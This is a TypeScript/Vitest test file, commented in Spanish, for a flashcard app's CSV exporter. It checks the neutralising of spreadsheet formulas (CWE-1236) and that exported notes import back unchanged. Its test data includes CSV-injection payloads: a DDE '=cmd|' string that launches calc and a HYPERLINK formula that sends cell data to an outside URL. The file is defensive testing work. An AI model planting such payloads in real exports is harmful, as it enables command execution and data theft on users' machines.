import { strToU8 } from 'fflate';
import { describe, expect, it } from 'vitest';
import type { Note } from '../schemas/decks';
import { parseCsv } from './csv';
import { buildCsv, neutralizeFormula, restoreFormula } from './exportCsv';

/** Solo lleva lo que lee el exportador */
const note = (fields: Record<string, unknown>) =>
  ({
    id: 'N1',
    sourceGuid: null,
    tags: [],
    kind: 'basic',
    front: 'f',
    back: 'b',
    ...fields,
  }) as unknown as Note;

describe('fórmulas en el CSV exportado (CWE-1236)', () => {
  it('antepone un apóstrofo a toda celda que empieza como fórmula, entre comillas o no', () => {
    const csv = buildCsv([
      {
        note: note({
          sourceGuid: "=cmd|' /C calc'!A0",
          front: '=HYPERLINK("http://x/?"&A1,"clic")',
          back: '+SUMA(A1)',
          tags: ['@etiqueta'],
        }),
        deckPath: ['-Mazo'],
      },
    ]);
    const line = csv.split('\r\n')[7] ?? '';
    expect(line).toBe(
      `'=cmd|' /C calc'!A0,Basic,'-Mazo,"'=HYPERLINK(""http://x/?""&A1,""clic"")","'+SUMA(A1)",'@etiqueta`,
    );
  });

  it('también cuando empieza con tabulador o retorno de carro', () => {
    expect(neutralizeFormula('\tabc')).toBe("'\tabc");
    expect(neutralizeFormula('\rabc')).toBe("'\rabc");
    expect(neutralizeFormula('texto normal')).toBe('texto normal');
    expect(neutralizeFormula("'ya con apóstrofo")).toBe("'ya con apóstrofo");
  });

  it('restoreFormula solo quita el apóstrofo que sigue a un inicio de fórmula', () => {
    expect(restoreFormula("'=1+1")).toBe('=1+1');
    expect(restoreFormula("'-5")).toBe('-5');
    expect(restoreFormula("'a menudo")).toBe("'a menudo");
    expect(restoreFormula('=sin apóstrofo')).toBe('=sin apóstrofo');
  });

  it('exportar y volver a importar deja el texto del alumno igual', () => {
    const csv = buildCsv([
      { note: note({ id: 'N2', front: '=2+2', back: '-5 mg al día' }), deckPath: ['Farmacología'] },
      { note: note({ id: 'N3', front: 'Una pregunta', back: '@dosis' }), deckPath: [] },
    ]);
    const parsed = parseCsv(strToU8(csv), 'export.csv');
    expect(parsed.notes.map((item) => [item.front, item.back])).toEqual([
      ['=2+2', '-5 mg al día'],
      ['Una pregunta', '@dosis'],
    ]);
  });
});
